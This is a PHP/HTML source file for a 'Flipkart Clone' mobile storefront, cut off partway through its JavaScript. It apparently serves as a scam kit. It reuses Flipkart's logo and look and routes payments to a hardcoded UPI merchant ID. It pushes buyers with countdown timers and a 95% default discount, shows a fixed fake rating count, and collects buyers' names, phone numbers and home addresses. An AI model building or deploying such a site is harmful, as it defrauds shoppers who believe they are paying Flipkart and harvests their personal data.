<?php
require_once __DIR__ . "/db.php";
$db = getDB();
$products = $db->query("SELECT * FROM products WHERE active=1 ORDER BY sort_order ASC")->fetchAll();
$settings = [];
foreach ($db->query("SELECT key, value FROM settings")->fetchAll() as $r) {
    $settings[$r["key"]] = $r["value"];
}
$upiId = $settings["upi_id"] ?? "merchant1069004.augp@aubank";
$merchantName = $settings["merchant_name"] ?? "MeeraTraders";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#2875f0" />
  <title>Flipkart Clone</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif; background: #f1f2f4; }
    a { text-decoration: none; color: inherit; }

    /* ── NAVBAR ── */
    .navbar {
      background: #2875f0;
      display: flex;
      align-items: center;
      padding: 6px 10px;
      position: sticky;
      top: 0;
      z-index: 100;
      gap: 8px;
    }
    .logo-wrap { display: flex; align-items: center; gap: 4px; min-width: 100px; }
    .logo-img { width: 75px; height: 35px; object-fit: contain; }
    .logo-thl { width: 25px; height: 25px; }
    .cart-svg { fill: #fff; }
    .search-bar {
      flex: 1;
      margin: 0 6px;
    }
    .search-bar input {
      width: 100%;
      height: 33px;
      border: none;
      border-radius: 2px;
      padding: 0 10px;
      font-size: 14px;
      outline: none;
    }
    .nav-back { display: flex; align-items: center; }
    .arrowsvg { height: 30px; width: 50px; padding-top: 5px; cursor: pointer; }

    /* ── CATEGORY STRIP ── */
    .k12 {
      height: 90px;
      padding: 8px 13px;
      display: flex;
      overflow-x: auto;
      background: #fff;
      gap: 6px;
      scrollbar-width: none;
    }
    .k12::-webkit-scrollbar { display: none; }
    .k12 img {
      height: 65px;
      width: 65px;
      object-fit: contain;
      flex-shrink: 0;
      border-radius: 4px;
      cursor: pointer;
    }

    /* ── BANNER CAROUSEL ── */
    .carousel-wrap { position: relative; overflow: hidden; background: #ddd; }
    .carousel-track { display: flex; transition: transform 0.4s ease; }
    .carousel-track img {
      min-width: 100%;
      height: 180px;
      object-fit: cover;
    }
    .carousel-btn {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      background: rgba(0,0,0,0.35);
      border: none;
      color: #fff;
      font-size: 20px;
      width: 30px;
      height: 50px;
      cursor: pointer;
      z-index: 5;
    }
    .carousel-btn.prev { left: 0; }
    .carousel-btn.next { right: 0; }
    .carousel-dots {
      display: flex;
      justify-content: center;
      gap: 5px;
      padding: 5px;
      background: #fff;
    }
    .dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: #ccc;
      cursor: pointer;
    }
    .dot.active { background: #2875f0; }

    /* ── SALE TIMER ── */
    .time {
      display: flex;
      align-items: center;
      background: #fff;
      padding: 4px 0;
      margin-top: 1px;
    }
    .timer {
      width: 60%;
      height: 70px;
      background: #fff;
      margin-left: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .end {
      font-size: 15px;
      color: #2875f0;
      margin-left: 10px;
      font-weight: 600;
    }
    .end1 {
      font-size: 15px;
      color: #2875f0;
      font-weight: 700;
    }
    .livesale {
      color: red;
      font-size: 13px;
      font-weight: 700;
      margin-left: 20px;
    }

    /* ── PRODUCT GRID ── */
    .cart1 {
      width: 100%;
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 0.3px;
      background-color: #f1f2f4;
    }
    .cart-card {
        overflow:auto;
      background: #fff;
      padding: 10px 8px 8px;
      cursor: pointer;
      text-decoration: none;
      color: inherit;
      display: block;
    }
    .cart-card:active { opacity: 0.85; }
    .img1 {
      width: 130px;
      height: 135px;
      padding: 14px;
      margin-top: 5px;
      margin-left: 4px;
      object-fit: contain;
    }
    .itemh5 { font-size: 13px; margin: 0; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
    .omsp { font-size: 14px; margin: 2px 0; }
    .offer { color: green; font-weight: 600; }
    .mrp-text { text-decoration: line-through; color: gray; margin-left: 4px; font-size: 12px; }
    .selling-price { font-weight: 700; font-size: 14px; color: #111; }
    .assur2 { width: 55px; margin-top: -4px; padding: 4px; vertical-align: middle; }
    .fd2d { font-size: 13px; color: #420eff; }
    .fd2d1 {
      border-radius: 2px;
      font-size: 12px;
      margin-left: 0;
      margin-bottom: 3px;
      color: #420eff;
      background: #eef0ff;
      padding: 1px 4px;
      display: inline-block;
    }
    .btn6 {
      background-color: #fb641b;
      width: 85%;
      height: 38px;
      border-radius: 5px;
      padding: 3px 0 5px 2px;
      margin-bottom: 4px;
      color: #fff;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      display: block;
    }

    /* ── PRODUCT DETAIL ── */
    .product-page { background: #fff; min-height: 100vh; }
    .product-navbar {
      background: #2875f0;
      display: flex;
      align-items: center;
      padding: 6px 10px;
      gap: 8px;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .aroas { display: flex; align-items: center; gap: 6px; }
    .aroas123 { position: relative; }
    .paphh4 { padding-top: 5px; margin-left: 5px; font-size: 16px; font-weight: 600; }

    /* product carousel */
    .detail-carousel { position: relative; overflow: hidden; background: #f8f8f8; }
    .detail-track { display: flex; transition: transform 0.35s ease; }
    .detail-track img {
      min-width: 100%;
      height: 280px;
      object-fit: contain;
      padding: 10px;
    }
    .detail-dots {
      display: flex;
      justify-content: center;
      gap: 5px;
      padding: 6px;
    }

    .product-info { padding: 10px 12px; }
    .product-name { font-size: 15px; color: #333; margin-bottom: 6px; }
    .product-price-row { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
    .product-sp { font-size: 22px; font-weight: 700; }
    .product-off { color: green; font-weight: 600; }
    .product-mrp { text-decoration: line-through; color: gray; font-size: 15px; }

    .color-section { padding: 10px 12px; border-top: 1px solid #eee; }
    .color-section h4 { font-size: 14px; margin-bottom: 8px; }
    .sdiv {
      width: 90px;
      height: 120px;
      box-shadow: #2875f0 0.5px 0.5px 2px 2px;
      filter: drop-shadow(0 0 2px #2875f0);
      border-radius: 4px;
      overflow: hidden;
      display: inline-block;
    }
    .sdiv img { width: 100%; height: 80%; object-fit: contain; }
    .scolorfont { font-size: 12px; text-align: center; padding-top: 4px; }

    .rating-section { padding: 8px 12px; border-top: 1px solid #eee; }
    .rating-section img { width: 36px; height: 18px; vertical-align: middle; }
    .return-img { width: 100%; margin-top: 8px; }

    .btndiv {
      width: 100%;
      background: #fff;
      display: flex;
      gap: 8px;
      padding: 10px;
      position: sticky;
      bottom: 0;
      border-top: 1px solid #ddd;
      z-index: 50;
    }
    .btn4 {
      background-color: #fb641b;
      flex: 1;
      height: 45px;
      border: none;
      border-radius: 3px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    /* ── ADDRESS PAGE ── */
    .address-page { background: #fff; min-height: 100vh; }
    .adhsvg { width: 100%; }
    .ad-name, .ad-phone7 {
      margin: 11px 0 0 8.7px;
      height: 42.5px;
      width: calc(100% - 17px);
      font-size: 16px;
      border: 1px solid #7392f8;
      border-radius: 3px;
      padding: 0 10px;
      outline: none;
    }
    .ad-phone, .ad-phone1, .ad-phone2 {
      margin: 10px 5px 5px 8.7px;
      height: 42.5px;
      width: calc(100% - 17px);
      font-size: 16px;
      border: 1px solid #7392f8;
      border-radius: 3px;
      padding: 0 10px;
      outline: none;
    }
    .ad-phone2 { background: #fff; cursor: pointer; }
    .btn3 {
      background-color: #fb641b;
      width: calc(100% - 34px);
      height: 50px;
      margin: 16px 17px;
      color: #fff;
      border: none;
      border-radius: 3px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      display: block;
    }
    .form-wrapper { padding-bottom: 80px; }

    /* ── SUMMARY PAGE ── */
    .summary-page { background: #f1f2f4; min-height: 100vh; }
    .summary-img { width: 100%; }
    .summary-body { padding: 10px; }
    .summary-card {
      background: #fff;
      border-radius: 4px;
      padding: 12px;
      margin-bottom: 8px;
    }
    .summary-card h5 { font-size: 14px; color: #555; margin-bottom: 4px; }
    .summary-card p { font-size: 15px; color: #111; }
    .summary-card .addr-text { font-size: 13px; color: #555; line-height: 1.5; }
    .sum-img { width: 100%; border-radius: 4px; margin-bottom: 8px; }
    .summary-price-row {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #eee;
      font-size: 14px;
    }
    .summary-total {
      display: flex;
      justify-content: space-between;
      padding: 10px 0 0;
      font-size: 16px;
      font-weight: 700;
      color: #2875f0;
    }
    .timer35 {
      display: flex;
      justify-content: space-between;
      height: 40px;
      background: #fff;
      align-items: center;
      padding: 0 15px;
      margin-bottom: 8px;
      border-radius: 4px;
    }

    /* ── PAYMENT PAGE ── */
    .payment-page { background: #f1f2f4; min-height: 100vh; }
    .pay-top-img { width: 100%; }
    .payment-options { padding: 10px; }
    .pay-option {
      background: #fff;
      border-radius: 4px;
      padding: 14px 16px;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 12px;
      cursor: pointer;
      border: 2px solid transparent;
      transition: border-color 0.2s;
    }
    .pay-option.selected { border-color: #2875f0; }
    .pay-option img { width: 50px; height: 30px; object-fit: contain; }
    .pay-option span { font-size: 15px; font-weight: 500; }
    .pay-option input[type=radio] { accent-color: #2875f0; width: 18px; height: 18px; }
    .pay-bottom-img { width: 100%; margin-top: 8px; }
    .pay-btn-wrap {
      padding: 12px;
      position: sticky;
      bottom: 0;
      background: #f1f2f4;
    }
    .btn-pay {
      background: #fb641b;
      color: #fff;
      border: none;
      width: 100%;
      height: 50px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 3px;
      cursor: pointer;
    }
    .upi-qr-wrap { text-align: center; padding: 10px; }
    .upi-qr-wrap img { width: 80%; max-width: 300px; }
    .pay-notice {
      font-size: 12px;
      color: #666;
      text-align: center;
      padding: 8px;
    }

    /* ── SUCCESS PAGE ── */
    .success-page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #fff;
      padding: 30px 20px;
      text-align: center;
    }
    .success-icon { font-size: 64px; margin-bottom: 16px; }
    .success-page h2 { font-size: 20px; color: #111; margin-bottom: 8px; }
    .success-page p { font-size: 14px; color: #555; margin-bottom: 6px; }
    .order-id { font-size: 18px; font-weight: 700; color: #2875f0; margin: 12px 0; }
    .orderok { color: #444; font-size: 16px; font-weight: 600; margin-bottom: 8px; }
    .pqpqppq { color: red; font-size: 12px; margin: 8px 0; }
    .btn8 {
      background-color: #fb641b;
      width: 160px;
      height: 45px;
      border: none;
      border-radius: 3px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
    }

    /* ── PAGES (SPA routing) ── */
    .page { display: none; }
    .page.active { display: block; }

    /* ── SEARCH RESULTS ── */
    .search-result-header {
      background: #fff;
      padding: 10px 12px;
      font-size: 14px;
      color: #555;
    }

    /* ── MISC ── */
    .adtopimg { width: 100%; box-shadow: #c7c7c7 1px 1px 4px 1px; }
    .ratinglogo { width: 36px; height: 18px; }
    .rattext { margin-left: 6px; font-size: 13px; color: #555; }
    .return { width: 100%; }
    .pro12 { height: 10px; }
    .assured-badge { width: 65px; vertical-align: middle; }
    .disc { padding-left: 5px; font-size: 13px; color: #555; }

    /* smooth page transitions */
    .page.active { animation: fadeIn 0.18s ease; }
    @keyframes fadeIn { from { opacity: 0.7; } to { opacity: 1; } }

    /* bottom nav space */
    .page-content { padding-bottom: 80px; }
  </style>
</head>
<body>

<!-- ═══════════════════════════════════════════ -->
<!--  HOME PAGE                                  -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-home" class="page active">
  <!-- Navbar -->
  <div class="navbar">
    <div class="logo-wrap">
      <img class="logo-thl" src="thl.svg" alt="" onerror="this.style.display='none'">
      <img class="logo-img" src="flipkart-logo.webp" alt="Flipkart">
      
    </div>
    <div class="search-bar">
      <input type="text" id="homeSearch" placeholder="Search For Products, Brands and More..." oninput="handleSearch(this.value)">
    </div>
    <svg class="cart-svg" width="20" height="20" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.32 2.405H4.887C3 2.405 2.46.805 2.46.805L2.257.21C2.208.085 2.083 0 1.946 0H.336C.1 0-.064.24.024.46l.644 1.945L3.11 9.767c.047.137.175.23.32.23h8.418l-.493 1.958H3.768l.002.003c-.017 0-.033-.003-.05-.003-1.06 0-1.92.86-1.92 1.92s.86 1.92 1.92 1.92c.99 0 1.805-.75 1.91-1.712l5.55.076c.12.922.91 1.636 1.867 1.636 1.04 0 1.885-.844 1.885-1.885 0-.866-.584-1.593-1.38-1.814l2.423-8.832c.12-.433-.206-.86-.655-.86z"/>
      </svg>
  </div>

  <!-- Category strip -->
  <div class="k12" id="categoryStrip">
    <img src="033f3268031fa0ba.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="0f3d008be60995d4.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="42f9a853f9181279.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="913e96c334d04395.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="1faac897db7fa1e8.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="824aa3a83b4057eb.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="aeb7da37a9e85209.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="cbcb478744635781.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="89d809684711712a.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="6ecb75e51b607880.jpg" alt="Cat" onclick="filterCategory(this)" >
    <img src="3e6d75f631ab6055.jpg" alt="Cat" onclick="filterCategory(this)" >
  </div>

  <!-- Banner carousel -->
  <div class="carousel-wrap">
    <button class="carousel-btn prev" onclick="moveBanner(-1)">&#8249;</button>
    <div class="carousel-track" id="bannerTrack">
      <img src="b1 (1).jpg"  alt="Banner" height="180" onerror="this.src='b1 (1).jpeg'">
      <img src="b1 (1).jpeg" alt="Banner" height="180" onerror="this.src='nav.jpg'">
      <img src="b1 (2).jpeg" alt="Banner" height="180" onerror="this.src='flip1.jpeg'">
      <img src="b1 (2).jpg"  alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
      <img src="b1 (3).jpeg" alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
      <img src="b1 (4).jpeg" alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
    </div>
    <button class="carousel-btn next" onclick="moveBanner(1)">&#8250;</button>
    <div class="carousel-dots" id="bannerDots"></div>
  </div>

  <!-- Sale Timer -->
  <div class="time">
    <div class="timer">
      <p class="end">SALE ENDS IN:</p>
      <p class="end1" id="homeTimer">16:00</p>
    </div>
    <div class="livesale">SALE IS LIVE</div>
  </div>

  <!-- Search Results header (hidden by default) -->
  <div class="search-result-header" id="searchHeader" style="display:none">
    Showing results for: <strong id="searchQuery"></strong>
    <span onclick="clearSearch()" style="float:right;color:#2875f0;cursor:pointer">✕ Clear</span>
  </div>

  <!-- Product Grid -->
  <div class="cart1" id="productGrid"></div>
</div>

<!-- ═══════════════════════════════════════════ -->
<!--  PRODUCT DETAIL PAGE                        -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-product" class="page">
  <!-- Navbar -->
  <div class="product-navbar">
    <div class="aroas123">
      <img class="arrowsvg" src="arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
    </div>
    <div class="logo-wrap" style="flex:1;justify-content:space-between">
      <img class="logo-img" src="flipkart-logo.webp" alt="Flipkart">
      <svg fill="white" width="20" height="20" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.32 2.405H4.887C3 2.405 2.46.805 2.46.805L2.257.21C2.208.085 2.083 0 1.946 0H.336C.1 0-.064.24.024.46l.644 1.945L3.11 9.767c.047.137.175.23.32.23h8.418l-.493 1.958H3.768l.002.003c-.017 0-.033-.003-.05-.003-1.06 0-1.92.86-1.92 1.92s.86 1.92 1.92 1.92c.99 0 1.805-.75 1.91-1.712l5.55.076c.12.922.91 1.636 1.867 1.636 1.04 0 1.885-.844 1.885-1.885 0-.866-.584-1.593-1.38-1.814l2.423-8.832c.12-.433-.206-.86-.655-.86z"/>
      </svg>
    </div>
  </div>

  <div class="page-content">
    <!-- Image Carousel -->
    <div class="detail-carousel">
      <div class="detail-track" id="detailTrack"></div>
      <div class="detail-dots" id="detailDots"></div>
    </div>

    <!-- Product Info -->
    <div class="product-info">
      <p class="product-name" id="detailName"></p>
      <div class="product-price-row">
        <span class="product-sp" id="detailSP"></span>
        <span class="product-off" id="detailOff"></span>
        <span class="product-mrp" id="detailMRP"></span>
      </div>
      <!-- Rating -->
        <div class="rating-section">
        <img class="ratinglogo" src="rating.png" alt="Rating" onerror="this.style.display='none'">
        <span class="rattext">4.3 ★ | 1,248 Ratings</span>
        </div>
      <img class="assured-badge" src="assured.png" alt="Assured" onerror="this.style.display='none'">
      <p style="margin-top:4px"><span class="fd2d">Free delivery in 2 days</span></p>
      <p style="margin-top:3px"><span class="fd2d1">Limited Time Deal</span></p>
    </div>

    <!-- Color selection -->
    <div class="color-section">
      <h4>Select Color</h4>
      <div class="sdiv" id="detailColorDiv">
        <img id="detailColorImg" src="" alt="">
        <p class="scolorfont" id="detailColorText"></p>
      </div>
    </div>

    
    <img class="return" src="/return.jpg" alt="">

    <!-- Ad image -->
    <div class="cart1" id="productGrid1"></div>
    <div class="pro12"></div>
  </div>

  <!-- Buy Buttons -->
  <div class="btndiv">
    <button class="btn4" onclick="goToAddress()">Buy Now</button>
  </div>
</div>

<!-- ═══════════════════════════════════════════ -->
<!--  ADDRESS PAGE                               -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-address" class="page">
  <div class="product-navbar">
    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('product')" style="filter:brightness(10)">
    <h4 class="paphh4" style="color:#fff">Address</h4>
  </div>

  <div class="form-wrapper">
    <img class="adhsvg" src="adh.svg" alt="" onerror="this.style.display='none'">
    <form id="addressForm" onsubmit="submitAddress(event)">
      <input class="ad-name" type="text" placeholder="Full Name (Required)" name="name" required>
      <input class="ad-phone7" type="tel" placeholder="Mobile Number (Required)" name="mobile" required pattern="[0-9]{10}" maxlength="10">
      <input class="ad-phone" type="text" inputmode="numeric" placeholder="Pincode (Required)" name="pincode" required pattern="[0-9]{6}" maxlength="6">
      <input class="ad-phone1" type="text" placeholder="City (Required)" name="city" required>
      <select class="ad-phone2" name="state" required>
        <option value="">-- Select State --</option>
        <option>Andhra Pradesh</option><option>Arunachal Pradesh</option>
        <option>Assam</option><option>Bihar</option><option>Chhattisgarh</option>
        <option>Goa</option><option>Gujarat</option><option>Haryana</option>
        <option>Himachal Pradesh</option><option>Jammu &amp; Kashmir</option>
        <option>Jharkhand</option><option>Karnataka</option><option>Kerala</option>
        <option>Madhya Pradesh</option><option>Maharashtra</option>
        <option>Manipur</option><option>Meghalaya</option><option>Mizoram</option>
        <option>Nagaland</option><option>Odisha</option><option>Punjab</option>
        <option>Rajasthan</option><option>Sikkim</option><option>Tamil Nadu</option>
        <option>Telangana</option><option>Tripura</option><option>Uttar Pradesh</option>
        <option>Uttarakhand</option><option>West Bengal</option>
        <option>Andaman &amp; Nicobar</option><option>Chandigarh</option>
        <option>Dadra and Nagar Haveli</option><option>Daman and Diu</option>
        <option>Delhi</option><option>Lakshadweep</option><option>Puducherry</option>
      </select>
      <input class="ad-phone" type="text" placeholder="House No., Building Name (Required)" name="house" required>
      <input class="ad-phone" type="text" placeholder="Road Name, Area, Colony (Required)" name="street" required>
      <button class="btn3" type="submit">Save Address &amp; Continue</button>
    </form>
  </div>
</div>

<!-- ═══════════════════════════════════════════ -->
<!--  SUMMARY PAGE                               -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-summary" class="page">
  <div class="product-navbar">
    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('address')" style="filter:brightness(10)">
    <h4 class="paphh4" style="color:#fff">Order Summary</h4>
  </div>

  <div class="page-content" style="padding:10px">
    <!-- Countdown -->
    <div class="timer35">
      <p>TIME UP IN:</p>
      <p id="summaryTimer" style="color:#2875f0;font-weight:700">6:00</p>
    </div>

    <!-- Product Summary -->
    <div class="summary-card">
      <img id="sumImg" class="sum-img" src="" alt="">
      <h5>Product</h5>
      <p id="sumName" style="font-size:14px;color:#333"></p>
    </div>

    <!-- Address Summary -->
    <div class="summary-card">
      <h5>Delivery Address</h5>
      <p class="addr-text" id="sumAddress"></p>
    </div>

    <!-- Price Breakup -->
    <div class="summary-card">
      <h5 style="margin-bottom:8px">Price Details</h5>
      <div class="summary-price-row">
        <span>Price (1 item)</span>
        <span id="sumMRP"></span>
      </div>
      <div class="summary-price-row">
        <span>Discount</span>
        <span style="color:green" id="sumDiscount"></span>
      </div>
      <div class="summary-price-row">
        <span>Delivery Charges</span>
        <span style="color:green">FREE</span>
      </div>
      <div class="summary-total">
        <span>Total Amount</span>
        <span id="sumTotal"></span>
      </div>
    </div>

    <img class="sum-img" src="summery-top.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
    <img class="sum-img" src="summery-bottom.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
  </div>

  <div class="btndiv">
    <button class="btn4" onclick="navigate('payment')">Proceed to Payment</button>
  </div>
</div>

<!-- ═══════════════════════════════════════════ -->
<!--  PAYMENT PAGE                               -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-payment" class="page">
  <div class="product-navbar">
    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('summary')" style="filter:brightness(10)">
    <h4 class="paphh4" style="color:#fff">Payment</h4>
  </div>

  <div class="page-content">
    <img class="pay-top-img" src="pay-top.jpeg" alt="" onerror="this.style.display='none'">

    <div class="payment-options">
      <p style="font-size:13px;color:#555;margin-bottom:8px">Choose Payment Method</p>

      <div class="pay-option" onclick="selectPayment('G-pay')">
        <input type="radio" name="payMethod" value="G-pay">
        <img src="gpay.png" alt="GPay" onerror="this.style.display='none'">
        <span>Google Pay (GPay)</span>
      </div>

      <div class="pay-option" onclick="selectPayment('PhonePe')">
        <input type="radio" name="payMethod" value="PhonePe">
        <img src="phonepe.png" alt="PhonePe" onerror="this.style.display='none'">
        <span>PhonePe</span>
      </div>

      <div class="pay-option" onclick="selectPayment('Paytm')">
        <input type="radio" name="payMethod" value="Paytm">
        <img src="paytm.png" alt="Paytm" onerror="this.style.display='none'">
        <span>Paytm</span>
      </div>

      <div class="pay-option" onclick="selectPayment('UPI')">
        <input type="radio" name="payMethod" value="UPI">
        <img src="upi.png" alt="UPI" onerror="this.style.display='none'">
        <span>All UPI Apps</span>
      </div>

      <div class="pay-option" onclick="selectPayment('QR')">
        <input type="radio" name="payMethod" value="QR">
        <img src="upi2.png" alt="QR" style="width:35px;height:35px" onerror="this.style.display='none'">
        <span>Scan QR Code</span>
      </div>
    </div>

    <!-- UPI QR (shown when QR selected) -->
    <div class="upi-qr-wrap" id="qrWrap" style="display:none">
      <img src="upi2.png" alt="UPI QR Code" onerror="this.style.display='none'">
      <p style="font-size:12px;color:#555;margin-top:6px">Scan with any UPI app to pay</p>
    </div>

    <img class="pay-bottom-img" src="payment-botom.jpeg" alt="" onerror="this.style.display='none'">
    <p class="pay-notice">
      If your payment is not successful, your order will be cancelled automatically.<br>
      Do not close any UPI app until payment is done.
    </p>
  </div>

  <div class="pay-btn-wrap">
    <button class="btn-pay" id="payNowBtn" onclick="processPayment()">
      Pay ₹<span id="payAmount">0</span>
    </button>
  </div>
</div>

<!-- ═══════════════════════════════════════════ -->
<!--  SUCCESS PAGE                               -->
<!-- ═══════════════════════════════════════════ -->
<div id="page-success" class="page">
  <div class="success-page">
    <div class="success-icon">✅</div>
    <p class="orderok">YOUR ORDER HAS BEEN RECEIVED</p>
    <p>Thank you for your payment, it's processing.</p>
    <p class="pqpqppq">
      If your payment is not successful, your order will be cancelled automatically!<br>
      Please make sure do not close any UPI app until payment is done!
    </p>
    <p>You will receive an order confirmation message with details of your order
      and a link to track your progress.</p>
    <p>Your Order ID:</p>
    <div class="order-id" id="orderIdDisplay"></div>
    <button class="btn8" onclick="navigate('home')">CONTINUE SHOPPING</button>
  </div>
</div>

<!-- ═══ PRODUCT DATA + APP LOGIC ═══ -->
<script>
// ─────────────────────────────────────────
//  PRODUCT DATA (from original Mr array)
// ─────────────────────────────────────────
const PRODUCTS = <?php
$jsProducts = array_map(function($p) {
    return [
        'id'            => $p['id'],
        'name'          => $p['name'],
        'color'         => $p['color'],
        'storage'       => $p['storage'],
        'selling_price' => $p['selling_price'],
        'mrp'           => $p['mrp'],
        'img1'          => $p['img1'],
        'img2'          => $p['img2'],
        'img3'          => $p['img3'],
        'img4'          => $p['img4'],
    ];
}, $products);
echo json_encode($jsProducts, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_SLASHES);
?>;

// ─────────────────────────────────────────
//  APP STATE
// ─────────────────────────────────────────
var currentPage = 'home';
var currentProduct = null;
var currentAddress = {};
var selectedPayment = '';
var bannerIndex = 0;
var bannerTotal = 6;
var bannerTimer = null;
var homeTimerSec = 960; // 16 min
var summaryTimerSec = 360; // 6 min
var summaryTimerInterval = null;
var homeTimerInterval = null;

// ─────────────────────────────────────────
//  NAVIGATION
// ─────────────────────────────────────────
function navigate(page) {
  document.querySelectorAll('.page').forEach(function(p) {
    p.classList.remove('active');
  });
  document.getElementById('page-' + page).classList.add('active');
  currentPage = page;
  window.scrollTo(0, 0);
}

// ─────────────────────────────────────────
//  RENDER HOME
// ─────────────────────────────────────────
function renderProductGrid(products) {
  var grid = document.getElementById('productGrid');
  var html = '';
  for (var i = 0; i < products.length; i++) {
    var p = products[i];
    var discount = Math.round(((parseInt(p.mrp) - parseInt(p.selling_price)) / parseInt(p.mrp)) * 100);
    if (isNaN(discount) || discount < 0) discount = 95;
    html += '<div class="cart-card" onclick="openProduct(\'' + p.id + '\')">';
    html += '<img class="img1" src="' + p.img1 + '" alt="" onerror="this.src=\'' + (p.img2 || p.img1) + '\'">';
    html += '<p class="itemh5">' + p.name + '</p>';
    html += '<h4 class="omsp"><span class="offer">' + discount + '% off</span><span class="mrp-text">₹' + parseInt(p.mrp).toLocaleString('en-IN') + '</span></h4>';
    html += '<div style="margin-top:-4px"><span class="selling-price">₹' + p.selling_price + '.00</span>';
    html += '<img class="assur2" src="assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
    html += '<p class="fd2d1">Limited Time Deal</p>';
    html += '<button class="btn6" onclick="event.stopPropagation();openProduct(\'' + p.id + '\')">Buy Now</button>';
    html += '<p><span class="fd2d">Free delivery in 2 days</span></p>';
    html += '</div>';
  }
  grid.innerHTML = html;
}

function renderProductGrid1(products) {
  var grid = document.getElementById('productGrid1');
  var html = '';
  
  // Determine how many cards to show (max 8, but can be less if products array is smaller)
  var maxCards = Math.min(8, products.length);
  
  // Create a copy of the products array to avoid mutating the original
  var shuffledProducts = [...products];
  
  // Fisher-Yates shuffle algorithm to randomize the array
  for (var i = shuffledProducts.length - 1; i > 0; i--) {
    var j = Math.floor(Math.random() * (i + 1));
    [shuffledProducts[i], shuffledProducts[j]] = [shuffledProducts[j], shuffledProducts[i]];
  }
  
  // Take the first 'maxCards' products from the shuffled array
  for (var i = 0; i < maxCards; i++) {
    var p = shuffledProducts[i];
    var discount = Math.round(((parseInt(p.mrp) - parseInt(p.selling_price)) / parseInt(p.mrp)) * 100);
    if (isNaN(discount) || discount < 0) discount = 95;
    html += '<div class="cart-card" onclick="openProduct(\'' + p.id + '\')">';
    html += '<img class="img1" src="' + p.img1 + '" alt="" onerror="this.src=\'' + (p.img2 || p.img1) + '\'">';
    html += '<p class="itemh5">' + p.name + '</p>';
    html += '<h4 class="omsp"><span class="offer">' + discount + '% off</span><span class="mrp-text">₹' + parseInt(p.mrp).toLocaleString('en-IN') + '</span></h4>';
    html += '<div style="margin-top:-4px"><span class="selling-price">₹' + p.selling_price + '.00</span>';
    html += '<img class="assur2" src="assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
    html += '<p class="fd2d1">Limited Time Deal</p>';
    html += '<button class="btn6" onclick="event.stopPropagation();openProduct(\'' + p.id + '\')">Buy Now</button>';
    html += '<p><span class="fd2d">Free delivery in 2 days</span></p>';
    html += '</div>';
  }
  grid.innerHTML = html;
}


var detailAutoSlide = null;

// ─────────────────────────────────────────
//  PRODUCT DETAIL
// ─────────────────────────────────────────
function openProduct(id) {
  var product = null;
  for (var i = 0; i < PRODUCTS.length; i++) {
    if (PRODUCTS[i].id === id) { product = PRODUCTS[i]; break; }
  }

  renderProductGrid1(PRODUCTS);
  
  if (!product) return;
  currentProduct = product;

  // Images
  var imgs = [product.img1, product.img2, product.img3, product.img4].filter(function(x) { return x && x.trim(); });
  var track = document.getElementById('detailTrack');
  var dots = document.getElementById('detailDots');
  var trackHtml = '';
  var dotsHtml = '';
  for (var i = 0; i < imgs.length; i++) {
    trackHtml += '<img src="' + imgs[i].trim() + '" alt="" onerror="this.src=\'' + imgs[0] + '\'">';
    dotsHtml += '<div class="dot' + (i === 0 ? ' active' : '') + '" onclick="goDetailSlide(' + i + ')"></div>';
  }
  track.innerHTML = trackHtml;
  dots.innerHTML = dotsHtml;
  track._current = 0;
  track._total = imgs.length;

  // Auto-slide detail carousel
  if (detailAutoSlide) clearInterval(detailAutoSlide);
  var totalSlides = imgs.length;
  detailAutoSlide = setInterval(function() {
    var next = (track._current + 1) % totalSlides;
    goDetailSlide(next);
  }, 2500);

  // Info
